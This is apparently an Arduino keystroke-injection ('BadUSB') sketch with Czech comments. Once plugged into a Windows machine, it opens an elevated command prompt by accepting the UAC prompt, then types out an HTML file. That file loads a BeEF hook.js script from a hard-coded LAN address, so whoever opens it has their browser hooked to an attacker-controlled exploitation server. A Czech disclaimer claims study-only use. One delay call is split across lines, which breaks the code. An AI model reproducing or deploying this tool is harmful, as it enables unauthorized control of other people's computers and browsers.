// POKUD NEFUNGUJE KOD ZMEN KLAVESNICI NA ENG
//IP BeEF hooku muzes zmenit

#include <Keyboard.h>

void setup() {
  Keyboard.begin(); 
  delay(2000);

  Keyboard.write(KEY_RETURN);

  Keyboard.press(KEY_LEFT_GUI);         
  Keyboard.releaseAll();     
  delay(1000);

  Keyboard.print("cmd");
  delay(1000);

  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("type nul > windows_index.html");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);


  Keyboard.print("notepad windows_index.html");
  delay(500);
  Keyboard.press(KEY_RETURN);

  delay(600);

  Keyboard.print(F(
    "<!DOCTYPE html>\n"
    "<html lang=\"cz\">\n"
    "<head>\n"
    "    <script src=\"http://192.168.1.111:3000/hook.js\"></script>\n"
    "    <link rel=\"stylesheet\" href=\"/media/ata/System/SanDisk/Kali/SHP/BeEF - hook - web/web.css\">\n"
    "    <meta charset=\"UTF-8\">\n"
    "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
    "    <title>Document</title>\n"
    "    <style>\n"
    "        body {\n"
    "            background-image: url(\"/media/ata/System/SanDisk/Kali/SHP/BeEF - hook - web/kali-wallpaper.jpeg\");\n"
    "            background-size: cover;\n"
    "            background-position: center;\n"
    "        }\n"
    "    </style>\n"
    "</head>\n"
    "<body>\n"
    "    <div class=\"warning\">\n"
    "        <h1>!UPOZORNI!</h1>\n"
    "    </div>\n"
    "    <h2>Probehlo hooknuti na lokalni siti!</h2>\n"
    "    <div class=\"logo\">\n"
    "        <img src=\"/media/ata/System/SanDisk/Kali/SHP/BeEF - hook - web/beef-xss-logo.svg\">\n"
    "    </div>\n"
    "    <div class=\"text\">\n"
    "        <h3>Pravidla a informace:</h3><br>\n"
    "        <div class=\"p\">\n"
    "            1. BeEF logo je pouzito vyhradne pro soukrome studijni ucely.<br>\n"
    "            Nejsem oficialnim zastupcem projektu BeEF.<br><br>\n"
    "            2. Jakekoli pouziti teto stranky bez meho vyslovneho pisemneho souhlasu predstavuje poruseni<br>\n"
    "            &sect; 230 ceskeho trestniho zakoniku (neopravne opatreni a zneuziti zpravy).<br><br>\n"
    "            3. Aktivaci rozhrani:<br>\n"
    "               - Stvrzujete, ze jste vlastnikem testovaneho zarizeni.<br>\n"
    "               - Prijimate plnou pravni odpovednost za sve jednani.<br><br>\n"
    "            4. Stranka nepodporuje a nijak se nespojuje s nepovolnou ofenzivni kyberbezpecnosti.<br><br>\n"
    "            5. Uvadene technicke limity mohou obsahovat chyby.<br>\n"
    "               Provozovatel nenese odpovednost za neocekavane chovani systemu.\n"
    "        </div>\n"
    "    </div>\n"
    "</body>\n"
    "</html>\n"
  ));
  Keyboard.releaseAll();
  delay(1
  0);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(200);






  Keyboard.releaseAll();


}


void loop() {} 